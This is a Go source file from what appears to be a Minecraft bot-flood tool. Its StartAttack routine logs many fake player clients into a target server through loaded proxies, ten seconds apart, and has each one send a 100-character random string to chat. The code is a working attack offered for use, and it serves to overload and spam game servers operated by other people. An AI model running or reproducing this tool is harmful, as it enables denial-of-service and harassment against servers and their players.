package component

import (
	"github.com/AkameMoe/Leone/utils"
	"github.com/Tnze/go-mc/bot"
	"github.com/Tnze/go-mc/chat"
	"github.com/google/uuid"
	"log"
	"math/rand"
	"time"
)

var (
	address   string
	port      int
	notjoined map[string]string
	joined    map[string]string
)

func StartAttack() {
	address, port = utils.GetAddr(utils.Target)
	notjoined = make(map[string]string)
	joined = make(map[string]string)

	notjoined = utils.Data

	time.Sleep(time.Second *20)

	//if true {
	//	time.Sleep(time.Second * 10)
	//	log.Println("Attack Start")
	//	mainloop()
	//	time.Sleep(time.Second * 30)
	//}
	log.Println("Start Main Loop")
	mainloop()
	select {}
}

func mainloop() {
	if true {
		for ID, name := range utils.Data {
			uuid, _ := uuid.FromBytes([]byte(ID))
			go playerJoin(name, uuid)
			time.Sleep(time.Second *10)
		}
	}
}

func playerJoin(name string, ID uuid.UUID) {
	client := bot.NewClient()
	uuid := ID.String()
	client.Auth.Name = name
	client.Auth.UUID = uuid

	client.ReducedDebugInfo = true
	client.IsDebug = false

	client.Events.Disconnect = onDisconnect
	client.Events.ChatMsg = onChatMsg

	//err := client.JoinServer(address, port)
	dialer := LoadProxy()
	err := client.JoinServerWithDialer(dialer, utils.Target)
	if err != nil {
		log.Println(err)
		return
	} else {
		log.Println("Login success: " + name)
	}
	err = client.HandleGame()
	client.SendMessage(RandStringBytes(100))
	if err != nil {
		log.Println(err)
	}
}

func onDisconnect(reason chat.Message) error {
	log.Println("Disconnected:" + reason.Text)
	return nil
}

func onChatMsg(c chat.Message, pos byte, uuid uuid.UUID) error {
	return nil
}


const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
func RandStringBytes(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}